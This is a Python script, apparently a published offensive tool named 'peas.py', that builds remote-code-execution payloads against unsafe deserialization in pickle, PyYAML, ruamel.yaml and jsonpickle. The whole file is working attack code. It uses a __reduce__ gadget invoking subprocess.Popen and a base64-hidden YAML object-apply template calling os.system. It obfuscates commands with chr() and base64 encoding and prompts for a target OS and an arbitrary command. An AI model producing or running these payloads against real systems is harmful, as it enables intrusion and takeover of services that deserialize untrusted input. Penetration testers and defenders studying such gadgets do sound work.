# Python Deserialization attack payload file generator for pickle ,pyYAML, ruamel.yaml and jsonpickle module by j0lt
# Requirements : Python 3.x , modules jsonpickle, pyyaml
# Version : 2.3
# Usage : python peas.py

import pickle
from base64 import b64encode, b64decode
import jsonpickle
import yaml
import subprocess
from copy import deepcopy


class Gen(object):
    def __init__(self, payload):
        self.payload = payload

    def __reduce__(self):
        return subprocess.Popen, (self.payload,)


class Payload(object):

    def __init__(self, c, location, base, os):
        self.location = location
        self.base = base
        self.os = os
        self.prefix = '' if self.os == 'linux' else "cmd.exe /c "
        self.cmd = self.prefix+c
        self.payload = b''
        self.quotes = True if "\'" in self.cmd or "\"" in self.cmd else False

    def pick(self):
        self.payload = pickle.dumps(Gen(tuple(self.case().split(" "))))
        self.payload = self.verifyencoding()
        self.savingfile("_pick")

    def ya(self):
        if self.quotes:
            self.payload = b64decode("ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0g"
                                     "cHl0aG9uCiAgLSAtYwogIC0gIl9faW1wb3J0X18oJ29zJykuc3lzdGVtKHN0cihfX2ltcG9ydF9fKCdiY"
                                     "XNlNjQnKS5iNjRkZWNvZGUoJw==") + b64encode(bytes(self.cmd, 'utf-8')) + \
                           b64decode("JykuZGVjb2RlKCkpKSI=")
        else:
            self.payload = bytes(yaml.dump(Gen(tuple(self.cmd.split(" ")))), 'utf-8')
        self.payload = self.verifyencoding()
        self.savingfile("_yaml")

    def js(self):
        self.payload = bytes(jsonpickle.encode(Gen(tuple(self.case().split(" ")))),
                             'utf-8')
        self.payload = self.verifyencoding()
        self.savingfile("_jspick")

    def __add__(self, other):
        return self + other

    def verifyencoding(self):
        return b64encode(self.payload) if self.base else self.payload

    def savingfile(self, suffix):
        open(self.location.__add__(suffix), "wb").write(self.payload)

    def chr_encode(self, data):
        d = '+'.join(['chr('+str(ord(ii))+')' for ii in data])
        return d

    def case(self):
        cmd = deepcopy(self.cmd)
        if self.quotes:
            cmd = self.prefix+"python -c exec({})".format(self.chr_encode("__import__('os').system"
                                                                               "(__import__('base64').b64decode({})"
                                                                              ".decode('utf-8'))".
                                                                               format(b64encode(bytes(self.cmd, 'utf-8')
                                                                                                ))))
        return cmd 

if __name__ == "__main__":
    cmd = input("Enter RCE command :")
    o = 'linux' if input("Enter operating system of target [linux/windows] . Default is linux :").lower() != "windows" \
        else 'windows'
    b = True if input("Want to base64 encode payload ? [N/y] :").lower() == "y" else False
    p = Payload(cmd, input("Enter File location and name to save :"), b, o)
    funtiondict = {"pickle": p.pick, "pyyaml": p.ya, "ruamel.yaml": p.ya, "jsonpickle": p.js}
    while 1:
        module = input("Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :").lower()
        if module in funtiondict.keys():
            funtiondict[module]()
            break
        elif module == "all":
            for i in funtiondict.keys():
                funtiondict[i]()
            break
        else:
            print("Wrong Input ")
            continue
    print("Done Saving file !!!!")
